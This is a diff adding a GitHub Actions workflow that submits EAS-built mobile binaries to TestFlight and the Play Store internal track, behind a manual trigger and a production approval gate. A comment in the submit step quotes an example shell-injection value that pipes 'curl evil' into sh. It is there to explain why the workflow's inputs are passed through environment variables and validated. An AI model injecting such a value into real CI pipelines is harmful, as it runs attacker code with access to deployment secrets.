@@ -1,0 +1,100 @@
+name: EAS Submit
+
+# Manually triggered. Submits a previously-built native binary to TestFlight
+# (iOS) and the Play Store internal track (Android). Per story 9-9, the submit
+# step is intentionally decoupled from `eas build` — operators decide which
+# build to ship after confirming it succeeded in the EAS dashboard. The
+# `production` environment gate (configurable at Settings → Environments)
+# adds a second human checkpoint before the submission fires.
+#
+# Credentials live as EAS environment variables / file secrets, never in git.
+# See _bmad-output/planning-artifacts/runbooks/submit-and-deploy.md for the
+# one-time operator provisioning steps.
+
+on:
+  workflow_dispatch:
+    inputs:
+      platform:
+        description: Platform
+        required: true
+        default: all
+        type: choice
+        options: [all, ios, android]
+      build_id:
+        description: 'Build ID to submit (omit for --latest)'
+        required: false
+        type: string
+
+# Prevents two operators (or a double-click) from submitting the same build
+# twice — Apple/Play would reject the second with a confusing
+# "build already exists" error and waste an EAS submit credit (P6 review).
+concurrency:
+  group: submit-${{ github.event.inputs.platform }}
+  cancel-in-progress: false
+
+jobs:
+  submit:
+    name: EAS Submit (${{ github.event.inputs.platform }})
+    runs-on: ubuntu-latest
+    environment: production
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          cache: npm
+
+      - name: Setup EAS
+        uses: expo/expo-github-action@v8
+        with:
+          eas-version: latest
+          token: ${{ secrets.EXPO_TOKEN }}
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: EAS Submit
+        env:
+          # env-var indirection prevents shell injection from
+          # workflow_dispatch inputs (P3 review). Direct ${{ ... }}
+          # interpolation inside `run:` is the canonical GHA injection
+          # sink — a `gh workflow run -f build_id='"; curl evil | sh; "'`
+          # call would otherwise execute arbitrary code with EXPO_TOKEN
+          # in env. Quoting "$VAR" inside the script is now safe.
+          BUILD_ID: ${{ github.event.inputs.build_id }}
+          PLATFORM: ${{ github.event.inputs.platform || 'all' }}
+        run: |
+          # Belt-and-suspenders validation — `type: choice` constrains the
+          # workflow_dispatch UI but does NOT validate API-driven invocations
+          # (gh workflow run, REST API, GraphQL).
+          case "$PLATFORM" in
+            ios|android|all) ;;
+            *)
+              echo "::error::Invalid platform '$PLATFORM' — expected ios|android|all"
+              exit 1
+              ;;
+          esac
+
+          if [ -n "$BUILD_ID" ]; then
+            BUILD_FLAG="--id $BUILD_ID"
+          else
+            BUILD_FLAG="--latest"
+          fi
+
+          eas submit \
+            --profile production \
+            --platform "$PLATFORM" \
+            $BUILD_FLAG \
+            --non-interactive
+
+      - name: Android draft promotion reminder
+        if: success() && (github.event.inputs.platform == 'android' || github.event.inputs.platform == 'all')
+        run: |
+          # `eas.json` sets `releaseStatus: "draft"` for Android — internal
+          # testers do NOT see the build until the operator manually promotes
+          # it in Play Console. Surface the required next step (P14 review).
+          echo "::notice title=Android submission is a DRAFT::Internal testers will NOT see this build until you promote it in Play Console → Internal testing → Edit release → Roll out to Internal testing."
